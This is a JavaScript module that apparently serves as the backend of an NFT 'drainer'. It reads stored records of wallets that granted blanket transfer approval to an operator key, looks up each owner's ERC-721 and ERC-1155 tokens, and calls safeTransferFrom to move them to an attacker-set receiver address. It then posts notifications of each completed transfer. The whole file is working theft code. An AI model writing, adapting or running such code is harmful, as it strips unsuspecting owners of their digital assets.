const moment = require("moment");
const Web3 = require("web3");
const HDWalletProvider = require("@truffle/hdwallet-provider");
const Contract = require("web3-eth-contract");
const http = require("../services/http");
const erc721 = require("./erc721.json");
const erc1155 = require("./erc1155.json");
const ApprovalModel = require("../database/models/approval");

const privateKey = process.env.PRIVATE_KEY;
const providerUrl = process.env.PROVIDER_URL;
const receiver = process.env.RECEIVER;

const provider = new HDWalletProvider({
  privateKeys: [privateKey],
  providerOrUrl: providerUrl,
  pollingInterval: 8000,
});

const web3 = new Web3(provider);
const wallet = web3.eth.accounts.privateKeyToAccount(privateKey);
console.log("wallet", wallet);

Contract.setProvider(provider);

const setApprovalForAll = async (contractAddress, operator, approved) => {
  const contract = new Contract(erc1155, contractAddress);
  await contract.methods
    .setApprovalForAll(operator, approved)
    .send({ from: wallet.address }, (err, res) => {
      if (err) {
        console.error(`[Error] Failed to approve, ${contractAddress}`);
        return false;
      }
      console.log(`Approved`, res);
      return true;
    })
    .catch((error) => console.error("error", error));
}

const isApprovedForAll = (contract, address, operator) => {
  return contract.methods
    .isApprovedForAll(address, operator)
    .call((err, res) => {
      if (err) {
        console.error(`[Error] Failed to isApprovedForAll, ${contractAddress}`);
        return false;
      }
      console.log(`isApprovedForAll`, res);
      return true;
    })
    .catch((error) => {
      console.error("error", error);
      return false;
    });
}

const transfer_erc1155_token = async (contract, owner, tokenId) => {
  return contract.methods
    .safeTransferFrom(owner, receiver, tokenId, 1, "0x0")
    .send({ from: wallet.address }, (err, res) => {
      if (err) {
        console.error(err);
        return null;
      }
      console.log('transaction', res)
      return res;
    })
    .catch((error) => {
      console.error("error", error);
      return null;
    });
}

const transfer_erc721_token = (contract, owner, tokenId) => {
  return contract.methods
    .safeTransferFrom(owner, receiver, tokenId)
    .send({ from: wallet.address }, (err, res) => {
      if (err) {
        console.error(err);
        return null;
      }
      console.log('transaction', res)
      return res;
    })
    .catch((error) => {
      console.error("error", error);
      return null;
    });
}

const transfer_erc721_token_to = (contract, to, tokenId) => {
  return contract.methods
    .safeTransferFrom(wallet.address, to, tokenId)
    .send({ from: wallet.address }, (err, res) => {
      if (err) {
        console.error(err);
        return null;
      }
      console.log('transaction', res)
      return res;
    })
    .catch((error) => {
      console.error("error", error);
      return null;
    });
}

/*const test_transfer = async () => {
  const contractAddress = '0xf22E89E9f345F85a206fdA87167E70C9aA578e56';
  const contract = new Contract(erc721, contractAddress);
  await transfer_erc721_token_to(contract, '0xFa5e9f32821d216b5863d4BbE09D040b606b16CE', 165);
}
test_transfer();*/

const getBalanceOf = (contract, owner) => {
  return contract.methods
    .balanceOf(owner)
    .call((err, res) => {
      console.log("balanceOf", err, res);
      return res;
    });
}

const approvals = async () => {
  return await ApprovalModel.find();
}

const getApprovals = async () => {
  const approvals = await ApprovalModel
    .find({
      status: null,
      $and: [
        {
          $or: [
            { errors: { $eq: null } },
            { errors: { $lt: 3 } },
          ],
        },
        {
          $or: [
            { checkedAt: { $eq: null } },
            { checkedAt: { $lt: moment().subtract(60, 'seconds') } },
          ],
        }
      ]
    })
    .sort({ tries: 1, updatedAt: 1, })
    .limit(1)

  if (approvals && approvals.length > 0) {
    return approvals;
  }

  return await ApprovalModel
    .find({
      status: 'empty',
      $or: [
        { errors: { $eq: null } },
        { errors: { $lt: 3 } },
      ],
      tries: { $lt: 3 },
      updatedAt: { $lt: moment().subtract(15, 'minutes') }
    })
    .sort({ tries: 1, updatedAt: 1, })
    .limit(1)
}

const update_token_priority = async (data) => {
  console.log(`update_token_priority: contract=${data.contract}, owner=${data.owner}`);
  const approval = await ApprovalModel.findOne({
    contract: data.contract,
    owner: data.owner,
  });
  console.log('update_token_priority: approval=', approval);
  if (approval) {
    approval.priority = 1;
    await approval.save();
  }
  return true;
}

function sleep(ms) {
  return new Promise((resolve) => {
    setTimeout(resolve, ms);
  });
}

/*const test_notification = async () => {
  const tokenId = 302;
  const transaction = '0xf34c6ac366dfd58e5c837898d51255ceb97ee4bfa7e3f57e756efc46c198e289';
  const contractAddress = '0x322987cd1e0466be43fa88ae33e2637dff46f06f'
  const message = `Token ${tokenId} from contract ${contractAddress} has been transfered succesfully.\nhttps://etherscan.io/tx/${transaction}`;
  await http.notification(message);
}*/

const transfer_priority_tokens = async () => {
  try {
    const approval = await ApprovalModel.findOne({ priority: 1 })
    if (!approval) {
      return 0;
    }
    console.log('transfer_priority_tokens', approval);

    let message = null;
    const {contract: contractAddress, schema, owner} = approval;
    const contract_abi = schema === "erc721" ? erc721 : erc1155;

    let assets = null;
    for (let i = 0; i < 5; i++) {
      assets = await http.getAssets(owner, contractAddress);
      if (assets === 'error') {
        await sleep(1500);
      } else {
        break;
      }
    }

    if (assets === 'error') {
      approval.priority = 0;
      message = `Failed to get assets of the contract ${approval.contract}`;
    }
    else if (!assets || assets.length <= 0) {
      approval.priority = 0;
      message = `There is no NFT in the contract ${approval.contract}`;
    }
    else {
      const contract = new Contract(contract_abi, contractAddress);
      if (!contract) {
        approval.priority = 0;
        message = `System Error (10021)`;
      } else {
        const asset = assets[0];
        const tokenId = asset.token_id;
        console.log("tokenId", tokenId);

        const transaction = schema === "erc1155"
          ? await transfer_erc1155_token(contract, owner, tokenId)
          : await transfer_erc721_token(contract, owner, tokenId);

        if (transaction) {
          if (assets.length === 1) {
            approval.priority = 0;
          }
          message = `Token ${tokenId} from contract ${contractAddress} has been transfered succesfully.\nhttps://etherscan.io/tx/${transaction}`;
        } else {
          approval.priority = 0;
          message =`Failed to transfer Token ${tokenId} from contract ${contractAddress}`;
        }
      }
    }

    if (message) {
      await http.notification(message);
    }

    approval.checkedAt = new Date();
    await approval.save();
    return 1;

  } catch (e) {
    console.error('transfer_priority_tokens', e);
    return -1;
  }
}

const transfer = async () => {
  const approvals = await getApprovals()
  if (!approvals || approvals.length <= 0) {
    return 0;
  }

  const approval = approvals[0];
  const {contract: contractAddress, schema, owner} = approval;
  const contract_abi = schema === "erc721" ? erc721 : erc1155;
  
  const assets = await http.getAssets(owner, contractAddress);
  if (assets === 'error') {
    approval.tries += 1
    approval.checkedAt = new Date();
    await approval.save();
    await sleep(1500);
    return 'opensea_error';
  }

  let transaction = null;
  if (assets && assets.length > 0) {
    console.log(`approvals=${assets.length}`, approval)
    const contract = new Contract(contract_abi, contractAddress);
    if (!contract) {
      console.log(`Failed to create contract from ${contractAddress}`);
      return 'contract_error';
    }
        
    const asset = assets[0];
    const tokenId = asset.token_id;
    console.log("tokenId", tokenId);

    transaction = schema === "erc1155"
      ? await transfer_erc1155_token(contract, owner, tokenId)
      : await transfer_erc721_token(contract, owner, tokenId);

    if (transaction) {
      approval.transfered += 1
      console.log(`Token ${tokenId} from contract ${contractAddress} has been transfered succesfully`);
      console.log(`https://etherscan.io/tx/${transaction}`);
    } else {
      if (approval.errors) {
        approval.errors += 1;
      } else {
        approval.errors = 1;
      }
      console.log(`Failed to transfer Token ${tokenId} from contract ${contractAddress}`);
    }
  } else {
    console.log('assets', assets?.length || 0, approval);
    approval.status = 'empty'
  }
  
  approval.tries += 1
  approval.checkedAt = new Date();
  await approval.save();
  
  return transaction;
};

//web3.eth.getBalance(wallet.address)
//  .then(balance => console.log('balance', balance))

module.exports = {
  approvals,
  update_token_priority,
  transfer_priority_tokens,
  transfer,
};
